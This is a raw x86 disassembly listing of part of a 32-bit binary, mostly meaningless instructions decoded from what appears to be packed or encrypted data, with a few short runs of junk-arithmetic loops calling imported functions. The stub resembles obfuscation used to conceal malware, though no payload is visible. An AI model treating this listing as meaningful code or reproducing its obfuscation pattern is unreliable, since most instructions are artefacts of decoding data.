  419614:	js     0x4195bc
  419616:	or     BYTE PTR [ebx],0xbf
  419619:	aam    0x8d
  41961b:	adc    BYTE PTR [esp+edx*2],bh
  41961e:	jnp    0x41965e
  419620:	icebp  
  419621:	mov    ss,WORD PTR [eax+esi*8-0x5b]
  419625:	jb     0x41964f
  419627:	jo     0x4195ed
  419629:	es call 0x84415752
  41962f:	sbb    dh,BYTE PTR [edi]
  419631:	dec    eax
  419632:	xchg   esi,eax
  419633:	loop   0x4195bb
  419635:	lock mov DWORD PTR [ebx+eiz*1+0x233f8e84],ebp
  41963d:	or     ebp,ebp
  41963f:	add    eax,DWORD PTR [edx+0x2b9cc4fc]
  419645:	div    DWORD PTR [esi]
  419647:	sub    al,0x3e
  419649:	cmp    BYTE PTR cs:[ecx-0x4c6e5990],0xee
  419651:	enter  0x686a,0x1e
  419655:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419656:	push   edx
  419657:	inc    esp
  419658:	gs popa 
  41965a:	call   0x9e4a00c0
  41965f:	aas    
  419660:	(bad)  
  419661:	js     0x419661
  419663:	lea    edi,[edi+0x58]
  419666:	repz inc eax
  419668:	(bad)  
  419669:	mov    ?,eax
  41966b:	int3   
  41966c:	xor    bl,BYTE PTR [ecx-0x75]
  41966f:	jmp    0x4195f9
  419671:	jbe    0x41962f
  419673:	pusha  
  419674:	sub    ecx,DWORD PTR ds:0x4039b013
  41967a:	push   edi
  41967b:	mov    edx,0x8415fb1d
  419680:	add    eax,0xdf46fb7d
  419685:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419687:	pop    es
  419688:	pop    ebp
  419689:	in     al,0xf6
  41968b:	inc    edi
  41968c:	pop    ebp
  41968d:	sbb    al,BYTE PTR [esi+0x2c]
  419690:	push   cs
  419691:	mov    ecx,0xe42fad15
  419696:	sti    
  419697:	jmp    0x260a:0x7c548d31
  41969e:	cmp    dh,al
  4196a0:	test   al,0xe
  4196a2:	mov    bh,0xb9
  4196a4:	(bad)  
  4196a5:	jnp    0x41964f
  4196a7:	push   0xffffff91
  4196a9:	add    esi,DWORD PTR [esi+0x26]
  4196ac:	stos   DWORD PTR es:[edi],eax
  4196ad:	ins    DWORD PTR es:[edi],dx
  4196ae:	and    BYTE PTR [esi],dl
  4196b0:	ins    BYTE PTR es:[edi],dx
  4196b1:	(bad)  
  4196b2:	scas   al,BYTE PTR es:[edi]
  4196b3:	xchg   ebp,eax
  4196b4:	mov    ebp,0xe6b20dcc
  4196b9:	cdq    
  4196ba:	into   
  4196bb:	imul   edx,DWORD PTR [edx],0xa8ae4eaa
  4196c1:	mov    ebp,0xfa3e041b
  4196c6:	rol    DWORD PTR [esi+0x75f113e7],0xe6
  4196cd:	mov    dl,0x6e
  4196cf:	jne    0x4196d5
  4196d1:	lock in al,dx
  4196d3:	les    edi,FWORD PTR [eax+0x7c]
  4196d6:	push   esi
  4196d7:	gs inc edx
  4196d9:	mov    ch,0x59
  4196db:	aaa    
  4196dc:	mov    dl,BYTE PTR ds:0x4d4f8b2d
  4196e2:	mov    ch,0x85
  4196e4:	sub    eax,0xbc8445de
  4196e9:	sub    al,0xff
  4196eb:	cmp    al,dl
  4196ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196ee:	adc    DWORD PTR [edx-0x6],edi
  4196f1:	or     dl,BYTE PTR [edi-0x1f]
  4196f4:	stc    
  4196f5:	jmp    0xc9f62956
  4196fa:	xor    ch,dh
  4196fc:	mov    ah,0x8a
  4196fe:	mov    al,ds:0x85c7a284
  419703:	int    0xfe
  419705:	cmp    BYTE PTR [ecx+edi*8+0x359c8fd5],cl
  41970c:	ins    DWORD PTR es:[edi],dx
  41970d:	in     al,dx
  41970e:	push   edi
  41970f:	sub    BYTE PTR [eax-0x507089c4],bh
  419715:	mov    al,0x93
  419717:	pop    edi
  419718:	popf   
  419719:	(bad)
  41971d:	add    al,0xbb
  41971f:	retf   0x8b3a
  419722:	push   edi
  419723:	sbb    DWORD PTR [edx],esp
  419725:	push   cs
  419726:	icebp  
  419727:	loopne 0x419746
  419729:	nop
  41972a:	sbb    al,0x41
  41972c:	xchg   ecx,eax
  41972d:	inc    esp
  41972e:	inc    ecx
  41972f:	cmp    BYTE PTR [edi+0x1f3e553e],bl
  419735:	outs   dx,BYTE PTR ds:[esi]
  419736:	ficom  DWORD PTR ds:0x12afc582
  41973c:	push   esp
  41973d:	jns    0x419705
  41973f:	or     eax,0x3c6dcd82
  419744:	fdivr  DWORD PTR [eax]
  419746:	jle    0x41975e
  419748:	jnp    0x4197b8
  41974a:	retf   
  41974b:	xor    al,0x9c
  41974e:	mov    ecx,DWORD PTR [ebp+0x14]
  419751:	add    esi,esi
  419753:	mov    ecx,DWORD PTR [ecx]
  419755:	mov    DWORD PTR [ebp-0x1c],ecx
  419758:	imul   edx,eax
  41975b:	xor    edi,DWORD PTR ds:0x42a801
  419761:	mov    ecx,0x4573
  419766:	add    edx,ecx
  419768:	sub    DWORD PTR ds:0x42a87d,ecx
  41976e:	mov    esi,0x7879
  419773:	mov    edi,0x1556
  419778:	not    DWORD PTR ds:0x42a845
  41977e:	xchg   esi,ecx
  419780:	add    DWORD PTR ds:0x42a7b5,0x585c
  41978a:	jmp    0x4199bf
  41978f:	iret   
  419790:	iret   
  419791:	(bad)  
  419792:	xlat   BYTE PTR ds:[ebx]
  419793:	(bad)  
  419794:	xlat   BYTE PTR ds:[ebx]
  419795:	iret   
  419796:	xlat   BYTE PTR ds:[ebx]
  419797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419798:	call   0x167fddeb
  41979d:	push   ss
  41979e:	test   al,0x38
  4197a0:	leave  
  4197a1:	jg     0x41981b
  4197a3:	adc    BYTE PTR [esi+0x78],bh
  4197a6:	js     0x41979c
  4197a8:	jmp    DWORD PTR [edx+0x1b]
  4197ab:	mov    ecx,0x51ff52a9
  4197b0:	popa   
  4197b1:	ja     0x419809
  4197b3:	fiadd  DWORD PTR [ecx-0xd2311a8]
  4197b9:	es push ebx
  4197bb:	pop    edx
  4197bc:	iret   
  4197bd:	jo     0x41979f
  4197bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197c0:	pushf  
  4197c1:	out    0xc0,eax
  4197c3:	pop    esp
  4197c4:	rol    DWORD PTR [edi+0x79],0x79
  4197c8:	pop    ebx
  4197c9:	push   ebp
  4197ca:	hlt    
  4197cb:	fwait
  4197cc:	call   0x551d:0x887533f9
  4197d3:	push   ebp
  4197d4:	push   ds
  4197d5:	pop    edx
  4197d6:	mov    BYTE PTR [edx+0x2c],cl
  4197d9:	pusha  
  4197da:	aas    
  4197db:	stos   DWORD PTR es:[edi],eax
  4197dc:	cmc    
  4197dd:	sar    DWORD PTR [edi-0x57a5a274],0x6a
  4197e4:	loop   0x419813
  4197e6:	gs std 
  4197e8:	fstp   QWORD PTR [edx]
  4197ea:	mov    edx,0xaa3671e1
  4197ef:	div    DWORD PTR [edi+0x61]
  4197f2:	test   eax,0x90a63674
  4197f7:	pushf  
  4197f8:	xchg   ebx,eax
  4197f9:	loopne 0x419837
  4197fb:	jne    0x4197d2
  4197fd:	adc    al,0xd3
  4197ff:	dec    esp
  419800:	xchg   esp,eax
  419801:	not    BYTE PTR [ebp+0x3f741318]
  419807:	jecxz  0x419880
  419809:	mov    cl,0x52
  41980b:	dec    ebx
  41980c:	pop    eax
  41980d:	fisttp WORD PTR [ebp+0x2c]
  419810:	fld    TBYTE PTR [esi+0x1a]
  419813:	addr16 int 0x9
  419816:	pushf  
  419817:	out    dx,al
  419818:	push   es
  419819:	mov    ecx,0x5cbb4458
  41981e:	mov    esi,DWORD PTR [eax+eiz*8]
  419821:	adc    BYTE PTR [ebx],0xf1
  419824:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419825:	sub    ecx,DWORD PTR [eax]
  419827:	aam    0xf2
  419829:	mov    ecx,0x93e3392d
  41982e:	mov    ds:0xcd587ccc,al
  419833:	add    BYTE PTR [ebx],ah
  419835:	mov    cl,0x7
  419837:	out    0x45,al
  419839:	ret    0xb0f3
  41983c:	loopne 0x419847
  41983e:	push   esi
  41983f:	mov    DWORD PTR [esi+0x671264fe],esp
  419845:	sub    eax,0xa9c48c5
  41984a:	ja     0x41982b
  41984c:	js     0x23998c07
  419852:	add    DWORD PTR [eax-0x2b6e2e3c],0x16dd9544
  41985c:	mov    ecx,0xa2299e3c
  419861:	and    bh,BYTE PTR [ecx+0x3643f454]
  419867:	stos   DWORD PTR es:[edi],eax
  419868:	or     esi,ebx
  41986a:	les    eax,FWORD PTR [esi]
  41986c:	jecxz  0x41982f
  41986e:	xchg   edi,eax
  41986f:	add    al,0xe2
  419871:	push   ecx
  419872:	bsf    ecx,esi
  419875:	jmp    0xbf9:0xb319f217
  41987c:	push   0x73
  41987e:	int    0x59
  419880:	leave  
  419881:	mov    ah,0x38
  419883:	hlt    
  419884:	inc    ebp
  419885:	inc    eax
  419886:	(bad)  [edi+0x66a235e9]
  41988c:	jae    0x419859
  41988e:	fmul   QWORD PTR ds:0xadce51c9
  419894:	sub    al,0xc
  419896:	cwde   
  419897:	push   ecx
  419898:	test   BYTE PTR [esi-0x47875c0e],bh
  41989e:	add    BYTE PTR [eax-0x29d37f8d],cl
  4198a4:	mov    cs,WORD PTR [ebx+0xbef34a]
  4198aa:	and    esi,ebp
  4198ac:	sbb    BYTE PTR ds:0xa366c229,cl
  4198b2:	or     ecx,esp
  4198b4:	inc    ebp
  4198b5:	push   esp
  4198b6:	cmp    DWORD PTR [eax],0xfffffff9
  4198b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198ba:	cmp    eax,DWORD PTR [ebx-0x26bcde2f]
  4198c0:	test   eax,0x21eab348
  4198c5:	pop    edi
  4198c6:	xchg   esp,eax
  4198c7:	jo     0x4198a8
  4198c9:	jbe    0x41986f
  4198cb:	ret    
  4198cc:	retf   0x3c66
  4198cf:	mov    esp,0x32ff159
  4198d4:	aad    0xb9
  4198d6:	lods   al,BYTE PTR ds:[esi]
  4198d7:	adc    bh,BYTE PTR [ebx]
  4198d9:	loope  0x419919
  4198db:	xchg   DWORD PTR [eax],edi
  4198dd:	ins    DWORD PTR es:[edi],dx
  4198de:	xchg   esp,eax
  4198df:	inc    ebx
  4198e0:	cmp    BYTE PTR [esi+0x6de340cd],cl
  4198e6:	push   eax
  4198e7:	jmp    0x41987b
  4198e9:	inc    eax
  4198ea:	push   ebp
  4198eb:	jmp    0x66:0x1f2fb128
  4198f2:	mov    al,ds:0xc947fc99
  4198f7:	test   cl,dh
  4198f9:	jo     0x4198bb
  4198fb:	adc    esi,DWORD PTR [ebx+0x29ef2cc3]
  419901:	pop    ds
  419902:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419903:	add    DWORD PTR [esi],ebx
  419905:	call   0x6257005a
  41990a:	rol    BYTE PTR [esp+edi*4-0x1],cl
  41990e:	mov    dl,0x81
  419910:	shl    esi,1
  419912:	enter  0xd75b,0x91
  419916:	sub    edi,esp
  419918:	push   es
  419919:	mov    ch,0x80
  41991b:	enter  0x8a5c,0xc8
  41991f:	dec    eax
  419920:	push   cs
  419921:	hlt    
  419922:	rcl    BYTE PTR [edi-0x52],1
  419925:	push   ss
  419926:	inc    ebp
  419927:	int    0xba
  419929:	mov    ch,0xb6
  41992b:	aaa    
  41992c:	mov    cl,BYTE PTR [ebx+0x7e8c06a2]
  419932:	push   ebx
  419933:	es push edx
  419935:	mov    ecx,0x3abefc49
  41993a:	jg     0x41990e
  41993c:	(bad)  [edi]
  41993e:	add    al,0x49
  419940:	pop    esp
  419941:	lock fmul st(0),st
  419944:	and    eax,0x9b3e55ce
  419949:	dec    edi
  41994a:	lds    esi,FWORD PTR [esi]
  41994c:	and    bl,BYTE PTR [ebp-0x615d84a1]
  419952:	dec    ebx
  419953:	xor    eax,esp
  419955:	mov    ss:0x8eaac220,al
  41995b:	in     al,dx
  41995c:	lock test DWORD PTR [edi+0x66],ebx
  419960:	(bad)  
  419961:	pop    ss
  419962:	push   ds
  419963:	xlat   BYTE PTR ds:[ebx]
  419964:	jmp    0x4199cf
  419966:	xor    BYTE PTR [ecx-0x26d860b8],dh
  41996c:	dec    ebp
  41996d:	inc    ebp
  41996e:	addr16 and eax,esp
  419971:	mov    BYTE PTR [edi],dh
  419973:	or     DWORD PTR [esi+0x40375f1c],ebp
  419979:	ficom  WORD PTR [esi-0x58adaab9]
  41997f:	xor    ecx,eax
  419981:	das    
  419982:	icebp  
  419983:	(bad)  
  419984:	rcl    BYTE PTR [ebp-0x4c],cl
  419987:	adc    al,0xf3
  419989:	mul    BYTE PTR [edx+0x5b]
  41998c:	add    eax,eax
  41998e:	push   es
  41998f:	sub    ebx,DWORD PTR [ecx+0x6e904b36]
  419995:	pop    ss
  419996:	mov    edi,0xa448b5ef
  41999b:	(bad)  
  41999c:	test   eax,0xf1c9dd4b
  4199a1:	das    
  4199a2:	mov    fs,WORD PTR [ecx+ebx*8-0x7e]
  4199a6:	dec    edi
  4199a7:	leave  
  4199a8:	int    0x50
  4199aa:	into   
  4199ab:	sub    bl,BYTE PTR [ecx+0x2625d869]
  4199b1:	dec    edi
  4199b2:	dec    edi
  4199b3:	inc    edx
  4199b4:	add    cl,bl
  4199b6:	int3   
  4199b7:	stos   DWORD PTR es:[edi],eax
  4199b8:	sub    BYTE PTR [ecx+0x40b1116c],ah
  4199be:	fs sub edx,edi
  4199c1:	adc    ecx,0x1fe4
  4199c7:	xor    esi,esi
  4199c9:	xor    DWORD PTR ds:0x42a80d,0x2675
  4199d3:	mov    DWORD PTR [ebp-0x28],esi
  4199d6:	mov    DWORD PTR ds:0x42a881,0x12
  4199e0:	cmp    DWORD PTR ds:0x42a881,0x0
  4199e7:	je     0x419a88
  4199ed:	cmp    DWORD PTR ds:0x42a881,0x16
  4199f4:	jne    0x419a15
  4199fa:	push   0x8ec2
  4199ff:	push   DWORD PTR [ebp-0x24]
  419a02:	push   0x4fb2
  419a07:	push   0x17f0
  419a0c:	push   DWORD PTR [ebp-0x20]
  419a0f:	call   DWORD PTR ds:0x41d11c
  419a15:	mov    ecx,DWORD PTR ds:0x42a881
  419a1b:	dec    ecx
  419a1c:	mov    DWORD PTR ds:0x42a881,ecx
  419a22:	jmp    0x4199e0
  419a27:	mov    DWORD PTR ds:0x42a765,0x1b
  419a31:	cmp    DWORD PTR ds:0x42a765,0x0
  419a38:	je     0x419a88
  419a3e:	cmp    DWORD PTR ds:0x42a765,0x5
  419a45:	jne    0x419a54
  419a4b:	push   DWORD PTR [ebp-0x14]
  419a4e:	call   DWORD PTR ds:0x41d1fc
  419a54:	cmp    DWORD PTR ds:0x42a765,0x6
  419a5b:	jne    0x419a6e
  419a61:	mov    ecx,DWORD PTR ds:0x42a765
  419a67:	dec    ecx
  419a68:	mov    DWORD PTR ds:0x42a765,ecx
  419a6e:	xor    ecx,ecx
  419a70:	or     ecx,DWORD PTR ds:0x42a765
  419a76:	dec    ecx
  419a77:	mov    DWORD PTR ds:0x42a765,ecx
  419a7d:	jmp    0x419a31
  419a82:	adc    DWORD PTR ds:0x42a805,ebx
  419a88:	mov    DWORD PTR [ebp-0x2c],esi
  419a8b:	and    DWORD PTR ds:0x42a849,ecx
  419a91:	mov    DWORD PTR [ebp-0x14],esi
  419a94:	add    ecx,DWORD PTR ds:0x42a7b5
  419a9a:	mov    DWORD PTR [ebp-0x8],esi
  419a9d:	mov    ecx,DWORD PTR [ebp-0x18]
  419aa0:	adc    DWORD PTR ds:0x42a83d,0x42a7b1
  419aaa:	xor    ecx,eax
  419aac:	xor    edi,edi
  419aae:	and    DWORD PTR ds:0x42a881,0x0
  419ab8:	jmp    0x419ac8
  419abd:	mov    eax,ds:0x42a881
  419ac2:	inc    eax
  419ac3:	mov    ds:0x42a881,eax
  419ac8:	cmp    DWORD PTR ds:0x42a881,0x1c
  419acf:	jae    0x419af8
  419ad5:	cmp    DWORD PTR ds:0x42a881,0x1e
  419adc:	jne    0x419aed
  419ae2:	push   0x42a805
  419ae7:	call   DWORD PTR ds:0x41d120
  419aed:	jmp    0x419abd
  419af2:	adc    eax,DWORD PTR ds:0x42a7cd
  419af8:	add    ecx,ebx
  419afa:	mov    DWORD PTR [ebp-0x20],ecx
  419afd:	mov    eax,ds:0x42a845
  419b02:	jmp    0x419d37
  419b07:	cmp    eax,0xcbcec3c5
  419b0c:	fcmovbe st,st(1)
  419b0e:	aad    0x68
  419b10:	xor    DWORD PTR [ecx+0xd],0x30
  419b14:	fistp  DWORD PTR [ebp-0x2b]
  419b17:	ror    bh,1
  419b19:	jg     0x419b93
  419b1b:	adc    BYTE PTR [esi+0x78],bh
  419b1e:	js     0x419b1e
  419b20:	test   ch,al
  419b22:	icebp  
  419b23:	retf   
  419b24:	mov    ah,ch
  419b26:	pop    esp
  419b27:	pop    ss
  419b28:	dec    edx
  419b29:	retf   0x6545
  419b2c:	push   ecx
  419b2d:	stc    
  419b2e:	xchg   DWORD PTR [ecx],ebx
  419b30:	cli    
  419b31:	adc    eax,0x44ad663f
  419b36:	sar    BYTE PTR [esi+0x307d6ab7],cl
  419b3c:	xor    DWORD PTR [edi+0x30a04b13],eax
  419b42:	mov    esi,0xe61823cd
  419b47:	fdiv   st(1),st
  419b49:	fistp  QWORD PTR [eax+edi*4+0x18]
  419b4d:	mov    ds:0x4a28ede3,al
  419b52:	pop    es
  419b53:	std    
  419b54:	lock test eax,0x89b24b47
  419b5a:	adc    dl,bl
  419b5c:	push   0xffffff90
  419b5e:	daa    
  419b5f:	fst    QWORD PTR [esp+eax*8+0x62]
  419b63:	dec    edi
  419b64:	mov    ah,0x3
  419b66:	or     al,0xb5
  419b68:	cmp    DWORD PTR [ebp+0x559a06a1],ebx
  419b6e:	loop   0x419af5
  419b70:	in     al,0x21
  419b72:	cld    
  419b73:	mov    al,0x91
  419b75:	or     DWORD PTR [ecx+eax*4+0x30],ebp
  419b79:	ins    DWORD PTR es:[edi],dx
  419b7a:	int    0x11
  419b7c:	mov    ds:0x39baccc2,eax
  419b81:	add    dh,bh
  419b83:	jb     0x419b30
  419b85:	sti    
  419b86:	sbb    eax,0xc3e92d3b
  419b8b:	call   0x49fd:0xaeaf7393
  419b92:	retf   0x1da
  419b95:	cs (bad) 
  419b97:	fiadd  DWORD PTR [ebx]
  419b99:	loop   0x419b64
  419b9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b9c:	das    
  419b9d:	and    eax,0x171b2660
  419ba2:	xchg   BYTE PTR ds:0x1e18db5c,ah
  419ba8:	mov    cl,0x4
  419baa:	jb     0x419ba3
  419bac:	jns    0x419bc0
  419bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419baf:	je     0x419be8
  419bb1:	loope  0x419b66
  419bb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bb4:	addr16 cli 
  419bb6:	lds    ecx,FWORD PTR [ebp+ecx*4-0x39611174]
  419bbd:	xchg   esp,eax
  419bbe:	ja     0x419bd3
  419bc0:	add    ah,BYTE PTR [ebx+0x15]
  419bc3:	sbb    cl,al
  419bc5:	jle    0x419b55
  419bc7:	push   esp
  419bc8:	fwait
  419bc9:	xchg   ecx,eax
  419bca:	pop    edi
  419bcb:	shl    DWORD PTR [edx+eiz*2],0x62
  419bcf:	hlt    
  419bd0:	test   eax,0x433d095
  419bd5:	mov    dl,bh
  419bd7:	cmp    BYTE PTR [esi],0xd
  419bda:	jmp    0x419b97
  419bdc:	ja     0x419b8d
  419bde:	pop    ds
  419bdf:	inc    ebx
  419be0:	push   esp
  419be1:	pushf  
  419be2:	in     eax,dx
  419be3:	aad    0xba
  419be5:	push   0x9b97b69d
  419bea:	loopne 0x419c2b
  419bec:	test   ah,ah
  419bee:	call   FWORD PTR [esi]
  419bf0:	cmp    DWORD PTR [ecx],0x8
  419bf3:	push   ss
  419bf4:	cmp    bh,BYTE PTR [edx-0x4d]
  419bf7:	mov    WORD PTR [ecx+edx*8-0x40],?
  419bfb:	sub    al,0xcd
  419bfd:	xchg   edx,eax
  419bfe:	in     al,0x2f
  419c00:	xchg   esi,eax
  419c01:	test   DWORD PTR [edi+0x124d4cb9],esi
  419c07:	sub    BYTE PTR [ebx-0x4a],0xf4
  419c0b:	sbb    eax,0xeed2a1d9
  419c10:	or     edx,DWORD PTR [edx+0x690bbacb]
  419c16:	and    bl,BYTE PTR [eax+eax*4-0x3a65dc87]
  419c1d:	and    BYTE PTR [edi+0x120367e7],bl
  419c23:	cmp    al,0x9d
  419c25:	mov    ebp,0xa4f2816e
  419c2a:	inc    eax
  419c2b:	mov    dl,0xbe
  419c2d:	pop    ss
  419c2e:	inc    esi
  419c2f:	dec    ecx
  419c30:	addr16 ret 0xc2d1
  419c34:	ret    0xcad7
  419c37:	pop    esp
  419c38:	push   ss
  419c39:	mov    eax,ds:0x73c81246
  419c3e:	call   0x681c8443
  419c43:	jle    0x419c6a
  419c45:	loope  0x419c02
  419c47:	sahf   
  419c48:	mov    al,0x4a
  419c4a:	rcr    BYTE PTR [ebx+0x71],1
  419c4d:	mov    cl,0x19
  419c4f:	and    dl,BYTE PTR [eax+0x4c2a1e8b]
  419c55:	push   ebx
  419c56:	retf   0x2e83
  419c59:	jmp    0xdecb:0xb458be14
  419c60:	xor    eax,0x77126065
  419c65:	fs adc al,0x4c
  419c68:	pop    ebp
  419c69:	sub    eax,0xbb51f3d2
  419c6e:	xor    edx,DWORD PTR [edi+eax*8+0x2a]
  419c72:	mov    esp,esp
  419c74:	and    eax,0x9f8d764
  419c79:	enter  0x4481,0x9e
  419c7d:	dec    edi
  419c7e:	xor    bh,BYTE PTR [esi-0x62]
  419c81:	xor    ebx,edi
  419c83:	inc    edi
  419c84:	and    BYTE PTR [edx-0x53],0x44
  419c88:	(bad)  
  419c89:	call   0xec740bb
  419c8e:	das    
  419c8f:	das    
  419c90:	and    eax,0x1028e70
  419c95:	in     al,0xc1
  419c97:	mov    al,0x34
  419c99:	xor    BYTE PTR [ecx],0x75
  419c9c:	mov    al,0x43
  419c9e:	push   ecx
  419c9f:	or     BYTE PTR [ebp-0x2283bf3a],ch
  419ca5:	pop    eax
  419ca6:	xlat   BYTE PTR ds:[ebx]
  419ca7:	(bad)  
  419ca8:	jg     0x419d17
  419caa:	(bad)  
  419cab:	sub    dl,bh
  419cad:	or     BYTE PTR [edi-0xf59205b],dl
  419cb3:	aam    0x69
  419cb5:	mov    esp,0x34ed3872
  419cba:	jns    0x419cc8
  419cbc:	adc    al,BYTE PTR ds:0xa38ed751
  419cc2:	aam    0xf5
  419cc4:	mov    esi,ss
  419cc6:	fmul   QWORD PTR [edx-0x7f54c0da]
  419ccc:	dec    ecx
  419ccd:	sti    
  419cce:	adc    ah,BYTE PTR [ecx]
  419cd0:	jmp    0x419cd0
  419cd2:	cmp    DWORD PTR [ebx-0x48],0x46f8b4cf
  419cd9:	popa   
  419cda:	and    ebx,DWORD PTR [ebx+0x7300ab09]
  419ce0:	cmc    
  419ce1:	jge    0x419cba
  419ce3:	or     edx,DWORD PTR [ebx]
  419ce5:	mov    cl,0xde
  419ce7:	xchg   edi,eax
  419ce8:	lea    eax,[ebp+ecx*1-0x72]
  419cec:	mov    ah,ch
  419cee:	test   BYTE PTR [esi+ecx*4],al
  419cf1:	inc    edi
  419cf2:	add    ebp,edi
  419cf4:	adc    eax,0x55ce5494
  419cf9:	(bad)  
  419cfb:	test   al,0xf9
  419cfd:	jae    0x419cf6
  419cff:	push   esp
  419d00:	jnp    0x419d56
  419d02:	repnz mov ?,WORD PTR [ebp+0x862dd3d]
  419d09:	xchg   BYTE PTR [esi],bh
  419d0b:	inc    ebx
  419d0c:	add    BYTE PTR [esi],dl
  419d0e:	xchg   edx,eax
  419d0f:	xchg   ecx,eax
  419d10:	int3   
  419d11:	cmc    
  419d12:	scas   eax,DWORD PTR es:[edi]
  419d13:	sbb    bl,BYTE PTR [ebp+0x5d]
  419d16:	adc    al,0x80
  419d18:	and    al,0xa7
  419d1a:	sti    
  419d1b:	jmp    0x8fba:0xe11c5d3a
  419d22:	loop   0x419cc0
  419d24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d25:	outs   dx,DWORD PTR ds:[esi]
  419d26:	sub    ch,cl
  419d28:	mov    eax,0x325e9f57
  419d2d:	or     DWORD PTR [ecx-0x455fa024],eax
  419d33:	pop    eax
  419d34:	jp     0x419d32
  419d36:	cmp    BYTE PTR [ebx-0x7bf01fbb],cl
  419d3c:	mov    DWORD PTR [ebx],ecx
  419d3e:	add    BYTE PTR [eax],al
  419d40:	inc    eax
  419d41:	mov    eax,DWORD PTR [ebp-0x4]
  419d44:	xor    eax,0x7510850
  419d49:	sbb    DWORD PTR ds:0x42a839,0x42a76d
  419d53:	add    eax,ebx
  419d55:	mov    DWORD PTR ds:0x42a889,0x7077
  419d5f:	cmp    edi,eax
  419d61:	mov    DWORD PTR ds:0x42a83d,0xab2
  419d6b:	jmp    0x419fa0
  419d70:	(bad)  
  419d71:	into   
  419d72:	ror    bh,cl
  419d74:	(bad)  
  419d76:	leave  
  419d77:	(bad)  
  419d78:	push   0xffffffe9
  419d7a:	or     esi,esi
  419d7c:	xor    edx,esp
  419d7e:	inc    ecx
  419d7f:	shr    al,0xcd
  419d82:	jg     0x419dfc
  419d84:	adc    BYTE PTR [esi+0x78],bh
  419d87:	js     0x419dd9
  419d89:	pop    ebp
  419d8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d8b:	mov    edx,0xf79c00f8
  419d90:	pop    ss
  419d91:	out    dx,al
  419d92:	(bad)  
  419d93:	in     eax,0xe4
  419d95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d96:	scas   al,BYTE PTR es:[edi]
  419d97:	sbb    eax,ebp
  419d99:	(bad)  
  419d9a:	hlt    
  419d9b:	stos   BYTE PTR es:[edi],al
  419d9c:	push   ds
  419d9d:	xlat   BYTE PTR ds:[ebx]
  419d9e:	mov    edi,0x9cde125e
  419da3:	ror    BYTE PTR [esi+0x30],1
  419da6:	loop   0x419d48
  419da8:	or     bl,BYTE PTR [edx+0x3bad76c3]
  419dae:	xchg   BYTE PTR [ebx+0x5f],cl
  419db1:	cmp    al,0xd0
  419db3:	lods   al,BYTE PTR ds:[esi]
  419db4:	cld    
  419db5:	jp     0x419dac
  419db7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419db8:	mov    bl,0x17
  419dba:	sar    DWORD PTR [ebx-0x3ab2042c],0xe4
  419dc1:	fadd   st,st(7)
  419dc3:	sbb    esi,ebp
  419dc5:	and    cl,BYTE PTR [eax+0x50]
  419dc8:	retf   0x813d
  419dcb:	mov    esp,0xd5e718b8
  419dd0:	in     al,0x17
  419dd2:	add    DWORD PTR [eax+0x5d494259],esp
  419dd8:	(bad)  
  419dd9:	aas    
  419dda:	mov    ds:0x91614c,eax
  419ddf:	inc    eax
  419de0:	imul   BYTE PTR [ebp+0x53]
  419de3:	stc    
  419de4:	pop    ds
  419de5:	outs   dx,DWORD PTR ds:[esi]
  419de6:	add    DWORD PTR [ebp-0x54],0xf5eacfaa
  419ded:	mov    eax,ds:0xca07d8aa
  419df2:	out    dx,al
  419df3:	sub    BYTE PTR [eax],0xd5
  419df6:	push   ebp
  419df7:	test   DWORD PTR [ebp+0x616cc375],0x813d0986
  419e01:	ss js  0x419e04
  419e04:	inc    DWORD PTR [edi+0x6d01ed9b]
  419e0a:	and    edi,DWORD PTR [eax-0x1d]
  419e0d:	jnp    0x419e0a
  419e0f:	idiv   DWORD PTR [eax+0x67]
  419e12:	dec    ebp
  419e13:	push   ebp
  419e14:	sahf   
  419e15:	ja     0x419dc8
  419e17:	jl     0x419dbe
  419e19:	inc    esi
  419e1a:	jg     0x419da6
  419e1c:	rol    BYTE PTR [ecx-0xbfe421a],0x23
  419e23:	adc    edx,ebx
  419e25:	(bad)  
  419e26:	adc    al,BYTE PTR [ecx-0xce96e13]
  419e2c:	iret   
  419e2d:	adc    eax,0xe3e2c812
  419e32:	dec    eax
  419e33:	jbe    0x419e37
  419e35:	gs sub al,0xff
  419e38:	mov    ds:0xae3feb6,eax
  419e3d:	sahf   
  419e3e:	mov    ecx,0x7c283a0
  419e43:	ror    ecx,1
  419e45:	mov    dh,0xaf
  419e47:	jp     0x419e7d
  419e49:	add    al,BYTE PTR [esi]
  419e4b:	clc    
  419e4c:	jno    0x419e09
  419e4e:	call   0x8c2b3d1d
  419e53:	or     DWORD PTR [edi+0x4c],ecx
  419e56:	int    0x6c
  419e58:	mov    bh,0x9f
  419e5a:	mov    esp,0x3c9d14a6
  419e5f:	mov    bh,0xf1
  419e61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e62:	sub    edx,DWORD PTR [ecx]
  419e64:	and    BYTE PTR [eax],cl
  419e66:	in     eax,0xb4
  419e68:	pop    eax
  419e69:	push   ebx
  419e6a:	repz xadd BYTE PTR [ebp+0x48cfcdde],dl
  419e72:	ins    DWORD PTR es:[edi],dx
  419e73:	cld    
  419e74:	mov    ecx,0x2a83d6bc
  419e79:	enter  0x2ee8,0xaf
  419e7d:	push   0xfffffffb
  419e7f:	inc    edi
  419e80:	in     al,0xe
  419e82:	pop    es
  419e83:	jb     0x419e1a
  419e85:	push   es
  419e86:	mov    bl,0x30
  419e88:	xchg   edx,eax
  419e89:	cwde   
  419e8a:	pushf  
  419e8b:	mov    eax,ds:0x134f3416
  419e90:	cmp    BYTE PTR [eax-0x65],dh
  419e93:	fwait
  419e94:	sbb    al,0xa5
  419e96:	fwait
  419e97:	call   0xb901:0x2097b7a6
  419e9e:	in     al,dx
